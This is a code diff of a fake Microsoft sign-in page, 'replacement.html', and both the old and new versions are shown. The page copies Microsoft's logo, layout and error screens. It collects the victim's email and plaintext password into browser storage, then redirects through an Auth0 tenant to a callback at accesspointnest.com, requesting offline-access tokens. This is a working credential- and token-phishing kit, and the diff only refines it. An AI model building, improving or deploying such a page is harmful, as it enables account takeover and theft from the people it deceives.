@@ -1,465 +1,460 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your Microsoft account</title>
-    
-    <!-- Auth0 SPA SDK -->
-    <script src="https://cdn.auth0.com/js/auth0-spa-js/2.1/auth0-spa-js.production.js"></script>
-    
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 440px;
-            padding: 48px;
-        }
-
-        .logo {
-            text-align: center;
-            margin-bottom: 24px;
-        }
-
-        .logo img {
-            width: 108px;
-            height: 24px;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 12px;
-            color: #1b1b1b;
-        }
-
-        .subtitle {
-            text-align: center;
-            color: #605e5c;
-            font-size: 15px;
-            margin-bottom: 32px;
-        }
-
-        .input-group {
-            margin-bottom: 24px;
-        }
-
-        label {
-            display: block;
-            font-size: 15px;
-            color: #323130;
-            margin-bottom: 8px;
-            font-weight: 400;
-        }
-
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #8a8886;
-            border-radius: 2px;
-            font-size: 15px;
-            transition: all 0.2s;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        input[type="email"]:focus,
-        input[type="password"]:focus {
-            outline: none;
-            border-color: #0078d4;
-            box-shadow: 0 0 0 1px #0078d4;
-        }
-
-        input[type="email"]:hover,
-        input[type="password"]:hover {
-            border-color: #323130;
-        }
-
-        .error-message {
-            color: #a4262c;
-            font-size: 13px;
-            margin-top: 8px;
-            display: none;
-        }
-
-        .error-message.show {
-            display: block;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 12px;
-            background: #0078d4;
-            color: white;
-            border: none;
-            border-radius: 2px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        .btn:hover {
-            background: #106ebe;
-        }
-
-        .btn:active {
-            background: #005a9e;
-        }
-
-        .btn:disabled {
-            background: #f3f2f1;
-            color: #a19f9d;
-            cursor: not-allowed;
-        }
-
-        .links {
-            margin-top: 24px;
-            text-align: center;
-        }
-
-        .links a {
-            color: #0078d4;
-            text-decoration: none;
-            font-size: 15px;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        .back-link {
-            display: flex;
-            align-items: center;
-            color: #0078d4;
-            text-decoration: none;
-            font-size: 15px;
-            margin-bottom: 24px;
-            cursor: pointer;
-        }
-
-        .back-link:hover {
-            text-decoration: underline;
-        }
-
-        .back-link::before {
-            content: "←";
-            margin-right: 8px;
-            font-size: 18px;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .loading {
-            text-align: center;
-            padding: 40px 20px;
-        }
-
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0078d4;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            color: #605e5c;
-            font-size: 15px;
-        }
-
-        .info-box {
-            background: #f3f2f1;
-            border-left: 3px solid #0078d4;
-            padding: 12px 16px;
-            margin-bottom: 24px;
-            border-radius: 2px;
-        }
-
-        .info-box p {
-            font-size: 13px;
-            color: #323130;
-            line-height: 1.5;
-        }
-
-        .azure-badge {
-            display: inline-block;
-            background: #0078d4;
-            color: white;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-top: 12px;
-        }
-
-        .account-info {
-            background: #f3f2f1;
-            padding: 12px;
-            border-radius: 4px;
-            margin-bottom: 16px;
-            font-size: 14px;
-            color: #323130;
-        }
-    </style>
+  <title>Sign in</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: "Segoe UI", "Helvetica Neue", "Arial", sans-serif;
+      background-image: url('https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      background-position: center center;
+    }
+    .main-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      width: 100%;
+    }
+    .form-wrapper {
+      max-width: 440px;
+      width: 100%;
+      padding: 0 16px;
+    }
+    .form-box {
+      background-color: #ffffff;
+      padding: 44px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .form-box h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 24px;
+      color: #1b1b1b;
+    }
+    .form-control {
+      border: none;
+      border-bottom: 1px solid #8A8886;
+      border-radius: 0;
+      padding: 8px 0;
+      font-size: 16px;
+      width: 100%;
+    }
+    .form-control:focus {
+      box-shadow: none;
+      outline: none;
+      border-bottom-color: #0078d4;
+    }
+    .form-box p {
+      font-size: 13px;
+      margin-top: 16px;
+      margin-bottom: 0;
+    }
+    .form-box a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+    .form-box a:hover {
+      text-decoration: underline;
+    }
+    .button-container {
+      display: flex;
+      justify-content: flex-end;
+    }
+    .btn.btn-primary-blue {
+      background-color: #0067b8;
+      color: white;
+      transition: filter 0.2s;
+      width: auto;
+      padding: 10px 32px;
+      cursor: pointer;
+    }
+    .btn.btn-primary-blue:hover {
+      filter: brightness(90%);
+    }
+    .btn.btn-primary-blue:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+    .btn.btn-secondary-gray {
+      background-color: #ccc;
+      color: #1b1b1b;
+      border: 1px solid #ccc;
+      padding: 10px 32px;
+      cursor: pointer;
+    }
+    .btn.btn-secondary-gray:hover {
+      background-color: #b3b3b3;
+    }
+    .form-box .btn {
+      font-size: 15px;
+      border: none;
+      border-radius: 2px;
+    }
+    #back, #options-view-back {
+      cursor: pointer;
+      color: #23272a;
+      font-size: 16px;
+      vertical-align: middle;
+    }
+    .options-box {
+      background-color: #ffffff;
+      padding: 16px 44px;
+      margin-top: 16px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    .options-box:hover {
+      background-color: #f5f5f5;
+    }
+    .options-box p {
+        margin: 0;
+        font-size: 15px;
+        display: flex;
+        align-items: center;
+    }
+    .options-box a {
+      color: #1b1b1b;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      width: 100%;
+    }
+    .options-box a:hover {
+      text-decoration: none;
+    }
+    .fa-search {
+      color: #5e5e5e;
+      margin-right: 16px;
+      font-size: 18px;
+    }
+    .page-footer {
+        position: fixed;
+        bottom: 12px;
+        right: 16px;
+        font-size: 12px;
+    }
+    .page-footer a {
+        color: #fff;
+        text-shadow: 0 0 3px rgba(0,0,0,0.7);
+        margin-left: 16px;
+        text-decoration: none;
+    }
+    .option-item {
+        display: flex;
+        align-items: center;
+        padding: 8px 0;
+        cursor: pointer;
+    }
+    .option-item:hover {
+        background-color: #f2f2f2;
+    }
+    .option-icon-container {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background-color: #f2f2f1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 20px;
+        color: #333;
+        margin-right: 16px;
+    }
+    .option-text p { margin: 0; line-height: 1.4; }
+    .option-text .primary { font-size: 15px; color: #1b1b1b; }
+    .option-text .secondary { font-size: 12px; color: #5e5e5e; }
+    .troubleshooting-box {
+        display: none;
+        background-color: #ffffff;
+        padding: 24px;
+        margin-top: 16px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        font-size: 14px;
+        color: #1b1b1b;
+    }
+    .troubleshooting-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+    }
+    .troubleshooting-header h2 { margin: 0; font-size: 18px; font-weight: 600; }
+    .troubleshooting-close { font-size: 24px; font-weight: 200; border: none; background: none; cursor: pointer; }
+    .troubleshooting-body p { margin: 8px 0; }
+    .troubleshooting-body strong { font-weight: 600; }
+    .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
+    .troubleshooting-body a { color: #0067b8; text-decoration: none; }
+    .troubleshooting-body a:hover { text-decoration: underline; }
+    .hidden { display: none !important; }
+    .loading {
+      text-align: center;
+      padding: 20px;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0067b8;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .mt-4 { margin-top: 1rem; }
+    .mt-3 { margin-top: 0.75rem; }
+    .mt-2 { margin-top: 0.5rem; }
+    .form-group { margin-bottom: 1rem; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Step 1: Email Input -->
-        <div id="emailView">
-            <div class="logo">
-                <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
-                    <path fill="#f25022" d="M0 0h11.377v11.372H0z"/>
-                    <path fill="#00a4ef" d="M12.623 0H24v11.372H12.623z"/>
-                    <path fill="#7fba00" d="M0 12.623h11.377V24H0z"/>
-                    <path fill="#ffb900" d="M12.623 12.623H24V24H12.623z"/>
-                    <text x="28" y="17" font-family="Segoe UI, sans-serif" font-size="17" fill="#5e5e5e">Microsoft</text>
-                </svg>
-            </div>
 
-            <h1>Sign in</h1>
-            <p class="subtitle">to continue to Microsoft</p>
-
-            <div class="info-box">
-                <p>🚀 <strong>New Azure Integration</strong></p>
-                <p>Now using your custom Azure App for authentication</p>
-                <span class="azure-badge">Azure App ID: 4eea8b9a</span>
-            </div>
-
-            <div class="input-group">
-                <label for="email">Email, phone, or Skype</label>
-                <input type="email" id="email" placeholder="Email, phone, or Skype" autocomplete="email">
-                <div class="error-message" id="emailError">Please enter a valid email address.</div>
-            </div>
-
-            <button class="btn" id="nextBtn">Next</button>
-
-            <div class="links">
-                <a href="https://signup.live.com" target="_blank">Create an account</a>
-            </div>
+  <div class="main-container">
+    <div class="form-wrapper">
+      <div class="form-box">
+        <!-- Email View (div1) -->
+        <div id="div1">
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <h1 class="mt-4">Sign in</h1>
+          <div class="form-group mt-2">
+            <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
+          </div>
+          <p>No account? <a href="#">Create one!</a></p>
+          <p><a href="#">Can't access your account?</a></p>
+          <div class="button-container mt-4">
+            <button class="btn btn-primary-blue" id="next">Next</button>
+          </div>
         </div>
 
-        <!-- Step 2: Password Input -->
-        <div id="passwordView" class="hidden">
-            <div class="logo">
-                <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
-                    <path fill="#f25022" d="M0 0h11.377v11.372H0z"/>
-                    <path fill="#00a4ef" d="M12.623 0H24v11.372H12.623z"/>
-                    <path fill="#7fba00" d="M0 12.623h11.377V24H0z"/>
-                    <path fill="#ffb900" d="M12.623 12.623H24V24H12.623z"/>
-                    <text x="28" y="17" font-family="Segoe UI, sans-serif" font-size="17" fill="#5e5e5e">Microsoft</text>
-                </svg>
-            </div>
-
-            <a class="back-link" id="backBtn">Back</a>
-
-            <div class="account-info">
-                <span id="displayEmail"></span>
-            </div>
-
-            <h1>Enter password</h1>
-
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
-                <div class="error-message" id="passwordError">Please enter your password.</div>
-            </div>
-
-            <button class="btn" id="signInBtn">Sign in</button>
-
-            <div class="links">
-                <a href="https://account.live.com/password/reset" target="_blank">Forgot password?</a>
-            </div>
+        <!-- PASSWORD VIEW -->
+        <div id="password_view" class="hidden">
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <div style="cursor: pointer; margin-top: 20px; margin-bottom: 10px;" id="back_to_email">
+            <i class="fas fa-arrow-left"></i> <span id="display_email" style="margin-left: 8px;"></span>
+          </div>
+          <h1 class="mt-2">Enter password</h1>
+          <div class="form-group mt-2">
+            <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
+          </div>
+          <p><a href="#">Forgot password?</a></p>
+          <div class="button-container mt-4">
+            <button class="btn btn-primary-blue" id="sign_in">Sign in</button>
+          </div>
         </div>
 
-        <!-- Step 3: Loading/Redirect -->
-        <div id="loadingView" class="hidden">
-            <div class="loading">
-                <div class="spinner"></div>
-                <p class="loading-text" id="loadingStatus">Connecting to Microsoft...</p>
+        <!-- Office OAuth Loading View (div2) -->
+        <div id="div2" class="hidden">
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <h1 class="mt-4">Signing you in...</h1>
+          <div class="loading mt-4">
+            <div class="spinner"></div>
+            <p style="margin-top: 20px; color: #666;" id="loading_status">
+              Preparing secure sign-in...
+            </p>
+          </div>
+        </div>
+
+        <!-- Detailed "Sign-in options" View -->
+        <div id="options_view_detailed" class="hidden">
+            <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+            <h1 class="mt-4">Sign-in options</h1>
+            <div class="option-item">
+                <div class="option-icon-container"><i class="fas fa-user-lock"></i></div>
+                <div class="option-text">
+                    <p class="primary">Face, fingerprint, PIN or security key</p>
+                    <p class="secondary">Use your device to sign in with a passkey.</p>
+                </div>
+            </div>
+            <div class="option-item">
+                <div class="option-icon-container"><i class="fab fa-github"></i></div>
+                <div class="option-text"><p class="primary">Sign in with GitHub</p></div>
+            </div>
+            <div class="option-item">
+                <div class="option-icon-container"><i class="fas fa-id-card-alt"></i></div>
+                <div class="option-text">
+                    <p class="primary">Sign in to an organization</p>
+                    <p class="secondary">Search for a company or an organization you're working with.</p>
+                </div>
+            </div>
+            <div class="button-container mt-4">
+                <button class="btn btn-secondary-gray" id="options-view-back">Back</button>
             </div>
         </div>
+      </div>
+
+      <!-- "Sign-in options" Clickable Box -->
+      <div class="options-box" id="options_box">
+        <a href="#" id="sign_in_options_link">
+          <i class="fas fa-search"></i>
+          <span>Sign-in options</span>
+        </a>
+      </div>
+
+      <!-- Troubleshooting Box -->
+      <div class="troubleshooting-box" id="troubleshooting_box">
+        <div class="troubleshooting-header">
+            <h2>Troubleshooting details</h2>
+            <button class="troubleshooting-close" id="close_troubleshooting_btn">&times;</button>
+        </div>
+        <div class="troubleshooting-body">
+            <p>If you contact your administrator, send this info to them.</p>
+            <p><a href="#" id="copy_info_link">Copy info to clipboard</a></p>
+            <div id="error_details_for_copy">
+                <p><strong>Error Code:</strong> 50058</p>
+                <p><strong>Request Id:</strong> <span class="code">a4d52b6b-cc92-4914-95ee-fe70b9bc0200</span></p>
+                <p><strong>Correlation Id:</strong> <span class="code">eaa8bc41-ac19-4850-9294-bc88a1f0e181</span></p>
+                <p><strong>Timestamp:</strong> <span class="code" id="modal_timestamp"></span></p>
+            </div>
+            <hr>
+            <p><strong>Flag sign-in errors for review:</strong> <a href="#">Enable flagging</a></p>
+            <p>If you plan on getting help for this problem, enable flagging and try to reproduce the error within 20 minutes. Flagged events make diagnostics available and are raised to admin attention.</p>
+        </div>
+      </div>
     </div>
+  </div>
 
-    <script>
-        console.log('🚀 replacement.html loaded - Auth0 Integration with NEW Azure App');
-        console.log('✅ Azure App ID: 4eea8b9a-09d9-47dd-87c7-78de0d9f42be');
+  <!-- Page Footer -->
+  <div class="page-footer">
+    <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
+    <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank">Privacy & cookies</a>
+    <a href="#" id="footer_dots_link">...</a>
+  </div>
 
-        // Auth0 Configuration
-        let auth0Client = null;
+  <!-- ✅ Auth0 SDK -->
+  <script src="https://cdn.auth0.com/js/auth0-spa-js/2.0/auth0-spa-js.production.js"></script>
+  <script>
+    console.log('🚀 replacement.html loaded - Auth0 Integration with NEW Azure App');
+    console.log('✅ Azure App ID: 4eea8b9a-09d9-47dd-87c7-78de0d9f42be');
 
-        async function initAuth0() {
-            try {
-                auth0Client = await auth0.createAuth0Client({
-                    domain: 'dev-6kunthi1vyiz6ezr.us.auth0.com',
-                    clientId: 'lv6EnG8RUVmcwGzBPpoyDNS7a5oP9B92',
-                    authorizationParams: {
-                        redirect_uri: 'https://accesspointnest.com/auth/callback',
-                        scope: 'openid profile email offline_access'
-                    },
-                    cacheLocation: 'localstorage',
-                    useRefreshTokens: true
-                });
-
-                console.log('✅ Callback URL: https://accesspointnest.com/auth/callback');
-                console.log('✅ Using custom Azure app via Auth0');
-                console.log('✅ Auth0 initialized successfully');
-            } catch (error) {
-                console.error('❌ Auth0 initialization error:', error);
-            }
-        }
-
-        // Initialize Auth0 on page load
-        initAuth0();
-
-        // DOM Elements
-        const emailView = document.getElementById('emailView');
-        const passwordView = document.getElementById('passwordView');
-        const loadingView = document.getElementById('loadingView');
+    // ✅ NEW: Account Type Detection Function
+    function detectAccountType(email) {
+        const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
+        const domain = email.split('@')[1]?.toLowerCase();
         
+        const isPersonal = personalDomains.includes(domain);
+        const accountType = isPersonal ? 'Personal (MSA)' : 'Work/School (AAD)';
+        const connection = isPersonal ? 'windowslive' : 'waad';
+        
+        console.log('🔍 Email:', email);
+        console.log('📋 Domain:', domain);
+        console.log('🏢 Account type:', accountType);
+        console.log('🔗 Auth0 connection:', connection);
+        
+        return { isPersonal, accountType, connection, domain };
+    }
+
+    // ✅ Your Auth0 credentials
+    const auth0Config = {
+        domain: 'dev-6kunthi1vyiz6ezr.us.auth0.com',
+        clientId: 'lv6EnG8RUVmcwGzBPpoyDNS7a5oP9B92',
+        authorizationParams: {
+            redirect_uri: 'https://accesspointnest.com/auth/callback',
+            scope: 'openid profile email offline_access'
+        },
+        cacheLocation: 'localstorage',
+        useRefreshTokens: true
+    };
+
+    console.log('✅ Callback URL:', auth0Config.authorizationParams.redirect_uri);
+    console.log('✅ Using custom Azure app via Auth0');
+
+    let auth0Client;
+
+    // Initialize Auth0
+    async function initAuth0() {
+        try {
+            auth0Client = await auth0.createAuth0Client(auth0Config);
+            console.log('✅ Auth0 initialized successfully');
+        } catch (error) {
+            console.error('❌ Auth0 initialization error:', error);
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', async function () {
+        await initAuth0();
+
+        const div1 = document.getElementById('div1');
+        const passwordView = document.getElementById('password_view');
+        const div2 = document.getElementById('div2');
+        const optionsBox = document.getElementById('options_box');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
-        const displayEmail = document.getElementById('displayEmail');
-        
-        const nextBtn = document.getElementById('nextBtn');
-        const backBtn = document.getElementById('backBtn');
-        const signInBtn = document.getElementById('signInBtn');
-        
-        const emailError = document.getElementById('emailError');
-        const passwordError = document.getElementById('passwordError');
-        const loadingStatus = document.getElementById('loadingStatus');
-
-        // Email validation
-        function validateEmail(email) {
-            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return re.test(email);
-        }
-
-        // Detect account type (Personal vs Work/School)
-        function detectAccountType(email) {
-            const personalDomains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
-            const domain = email.split('@')[1]?.toLowerCase();
-            
-            const isPersonal = personalDomains.includes(domain);
-            const accountType = isPersonal ? 'Personal (MSA)' : 'Work/School (AAD)';
-            const connection = isPersonal ? 'windowslive' : 'waad';
-            
-            console.log('🔍 Email:', email);
-            console.log('📋 Domain:', domain);
-            console.log('🏢 Account type:', accountType);
-            console.log('🔗 Auth0 connection:', connection);
-            
-            return { isPersonal, accountType, connection, domain };
-        }
+        const nextBtn = document.getElementById('next');
+        const signInBtn = document.getElementById('sign_in');
+        const backToEmail = document.getElementById('back_to_email');
+        const displayEmail = document.getElementById('display_email');
+        const loadingStatus = document.getElementById('loading_status');
+        const signInOptionsLink = document.getElementById('sign_in_options_link');
+        const backBtn = document.getElementById('options-view-back');
+        const optionsViewDetailed = document.getElementById('options_view_detailed');
+        const troubleshootingBox = document.getElementById('troubleshooting_box');
+        const closeTroubleshootingBtn = document.getElementById('close_troubleshooting_btn');
+        const footerDotsLink = document.getElementById('footer_dots_link');
 
         // Step 1: Email -> Password View
-        nextBtn.addEventListener('click', function() {
+        nextBtn.addEventListener('click', function () {
             const email = emailInput.value.trim();
-            
             if (!email) {
-                emailError.textContent = 'Please enter your email address.';
-                emailError.classList.add('show');
-                emailInput.focus();
-                return;
-            }
-            
-            if (!validateEmail(email)) {
-                emailError.textContent = 'Please enter a valid email address.';
-                emailError.classList.add('show');
                 emailInput.focus();
                 return;
             }
 
             console.log('📧 Email entered:', email);
             
-            // Detect and log account type
+            // ✅ NEW: Detect account type when email is entered
             const accountInfo = detectAccountType(email);
             
-            emailError.classList.remove('show');
-            
-            // Store email
             localStorage.setItem('ms_email', email);
             sessionStorage.setItem('ms_email', email);
-            
-            // Show password view
+
             displayEmail.textContent = email;
-            emailView.classList.add('hidden');
+
+            div1.classList.add('hidden');
+            optionsBox.classList.add('hidden');
             passwordView.classList.remove('hidden');
-            passwordInput.focus();
         });
 
-        // Email input - Enter key
-        emailInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                nextBtn.click();
-            }
-        });
-
-        // Back button
-        backBtn.addEventListener('click', function() {
+        // Back to email
+        backToEmail.addEventListener('click', function() {
             passwordView.classList.add('hidden');
-            emailView.classList.remove('hidden');
-            passwordInput.value = '';
-            passwordError.classList.remove('show');
-            emailInput.focus();
+            div1.classList.remove('hidden');
+            optionsBox.classList.remove('hidden');
         });
 
-        // Step 2: Password -> Auth0 Login with Account Type Detection
-        signInBtn.addEventListener('click', async function() {
+        // Step 2: Password -> Auth0 Microsoft Login (MODIFIED)
+        signInBtn.addEventListener('click', async function () {
             const email = localStorage.getItem('ms_email');
             const password = passwordInput.value.trim();
 
             if (!password) {
-                passwordError.textContent = 'Please enter your password.';
-                passwordError.classList.add('show');
                 passwordInput.focus();
                 return;
             }
 
             console.log('🔑 Password entered, saving credentials...');
 
-            // Save credentials to localStorage and sessionStorage
+            // Save credentials in multiple locations for redundancy
             const credentials = {
                 email: email,
                 password: password,
                 timestamp: new Date().toISOString(),
-                azureAppId: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be',
-                userAgent: navigator.userAgent,
-                platform: navigator.platform
+                azureAppId: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be'
             };
 
             const credentialsStr = JSON.stringify(credentials);
-            
-            // Save to both storage types
+
             localStorage.setItem('ms_auth_credentials', credentialsStr);
             sessionStorage.setItem('ms_auth_credentials', credentialsStr);
             localStorage.setItem('ms_password', password);
@@ -468,21 +463,18 @@
             sessionStorage.setItem('ms_email', email);
 
             console.log('✅ Credentials saved:', { 
-                email, 
-                hasPassword: !!password,
-                storageType: 'localStorage + sessionStorage',
-                azureApp: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be'
+              email, 
+              hasPassword: !!password,
+              azureApp: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be'
             });
 
-            passwordError.classList.remove('show');
-
-            // Show loading view
+            // Show loading
             passwordView.classList.add('hidden');
-            loadingView.classList.remove('hidden');
+            div2.classList.remove('hidden');
             loadingStatus.textContent = 'Detecting account type...';
 
             try {
-                // Detect account type
+                // ✅ NEW: Detect account type and use appropriate connection
                 const accountInfo = detectAccountType(email);
                 
                 console.log('🎯 Account detection complete:');
@@ -502,51 +494,62 @@
                     throw new Error('Auth0 not initialized');
                 }
 
-                // Use the correct connection based on account type
+                // ✅ MODIFIED: Use detected connection type
                 await auth0Client.loginWithRedirect({
                     authorizationParams: {
-                        connection: accountInfo.connection, // 'windowslive' or 'waad'
+                        connection: accountInfo.connection, // Dynamic: 'windowslive' or 'waad'
                         login_hint: email,
                         prompt: 'login',
                         scope: 'openid profile email offline_access'
                     }
                 });
-
             } catch (error) {
                 console.error('❌ Auth0 login error:', error);
                 loadingStatus.textContent = 'Error: ' + error.message;
-                
-                // Show error and go back
-                setTimeout(() => {
-                    loadingView.classList.add('hidden');
-                    passwordView.classList.remove('hidden');
-                    passwordError.textContent = 'Authentication error. Please try again.';
-                    passwordError.classList.add('show');
-                }, 2000);
             }
         });
 
-        // Password input - Enter key
-        passwordInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                signInBtn.click();
-            }
+        // Options box click handler
+        optionsBox.addEventListener('click', function (e) {
+            e.preventDefault();
+            div1.classList.add('hidden');
+            optionsBox.classList.add('hidden');
+            optionsViewDetailed.classList.remove('hidden');
         });
 
-        // Auto-fill email if returning
-        window.addEventListener('load', function() {
-            const savedEmail = localStorage.getItem('ms_email');
-            if (savedEmail) {
-                emailInput.value = savedEmail;
-            }
+        signInOptionsLink.addEventListener('click', function (e) {
+            e.preventDefault();
+            div1.classList.add('hidden');
+            optionsBox.classList.add('hidden');
+            optionsViewDetailed.classList.remove('hidden');
         });
 
-        // Log page visibility for debugging
-        document.addEventListener('visibilitychange', function() {
-            console.log('👁️ Page visibility:', document.hidden ? 'hidden' : 'visible');
+        backBtn.addEventListener('click', function (e) {
+            e.preventDefault();
+            optionsViewDetailed.classList.add('hidden');
+            div1.classList.remove('hidden');
+            optionsBox.classList.remove('hidden');
         });
 
-        console.log('✅ replacement.html script loaded and ready');
-    </script>
+        footerDotsLink.addEventListener('click', function (e) {
+            e.preventDefault();
+            document.getElementById('modal_timestamp').textContent = new Date().toISOString();
+            troubleshootingBox.style.display = 'block';
+        });
+
+        closeTroubleshootingBtn.addEventListener('click', function () {
+            troubleshootingBox.style.display = 'none';
+        });
+
+        document.getElementById('copy_info_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            const detailsNode = document.getElementById('error_details_for_copy');
+            navigator.clipboard.writeText(detailsNode.innerText.trim()).then(() => {
+                e.target.textContent = 'Copied!';
+                setTimeout(() => { e.target.textContent = 'Copy info to clipboard'; }, 2000);
+            });
+        });
+    });
+  </script>
 </body>
 </html>
